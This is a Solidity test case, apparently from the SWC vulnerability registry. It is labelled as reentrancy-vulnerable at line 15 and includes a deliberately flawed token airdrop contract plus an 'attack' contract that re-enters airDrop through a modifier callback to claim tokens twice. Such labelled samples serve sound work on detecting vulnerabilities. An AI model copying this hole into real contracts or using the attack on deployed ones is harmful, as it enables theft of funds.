/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * @author: - 
 * @vulnerable_at_lines: 15
 */

pragma solidity 0.4.26;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  //If a contract has a zero balance and supports the token give them some token
  // <yes> <report> REENTRANCY
  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

  //Checks that the contract responds the way we want
  modifier supportsToken() {
    bytes32 s1 = keccak256(abi.encodePacked("Nu Token"));
    bytes32 s2 = Bank(msg.sender).supportsToken();
    require(s1 == s2);
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32 p){
        p =(keccak256(abi.encodePacked("Nu Token")));
        return p;
    }
}

contract attack{ //An example of a contract that breaks the contract above.
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32 p){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        p =(keccak256(abi.encodePacked("Nu Token")));
        return p;
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}
